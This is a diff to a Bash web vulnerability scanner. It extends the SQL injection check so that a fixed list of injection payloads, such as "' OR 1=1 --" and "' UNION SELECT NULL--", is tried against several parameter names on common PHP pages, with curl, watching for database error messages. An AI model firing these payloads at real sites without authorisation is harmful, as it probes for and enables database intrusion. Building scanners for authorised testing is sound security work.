@@ -47,7 +47,7 @@ fi
 
 vuln_web() {
 	common_endpoints=("index.php" "login.php" "search.php" "product.php" "user.php" "admin.php")
-
+	common_parameters=("id" "user" "product" "category" "page")
 	sqli_payloads=("'" "\" OR 1=1 --" "' OR 'a'='a" "' OR 1=1#" "' UNION SELECT NULL--" "' OR '1'='1' --" "--" "' OR '1'='1'#" "' OR 'a'='a'--")
 
 	regex='^((https?|ftp):\/\/)?([a-zA-Z0-9.-]+)(:[0-9]{1,5})?(\/.*)?$'
@@ -159,16 +159,22 @@ vuln_web() {
         fi
         #Check SQL injection
 	thechecker=0
-    	for endpoint in "${common_endpoints[@]}"; do
-        	for payload in "${sqli_payloads[@]}"; do
-        	    	full_url="${url}/${endpoint}?id=1${payload}"
-            		response=$(curl -s "$full_url")
-            		if [[ $response == *"SQL syntax"* || $response == *"MySQL"* || $response == *"Warning"* ]]; then
+	for endpoint in "${common_endpoints[@]}"; do
+    		for parameter in "${common_parameters[@]}"; do
+        		for payload in "${sqli_payloads[@]}"; do
+		            full_url="${url}/${endpoint}?${parameter}=1${payload}"
+
+		            response=$(curl -s "$full_url")
+
+		            if [[ $response == *"SQL syntax"* || $response == *"MySQL"* || $response == *"Warning"* ]]; then
                 		write_report "[${BLUE}VULNERABLE${NC}] Possible SQL Injection at ${full_url} with payload '${payload}'"
-				thechecker+=1
-            		fi
-        	done
-    	done
+                		thechecker+=1
+            		    fi
+        		done
+    		done
+	done
+
+
 	if [[ "$thechecker" == 0 ]]; then
 		echo "[${RED}INFO${NC}]This url is not vulnerable to sql injection"
 	fi
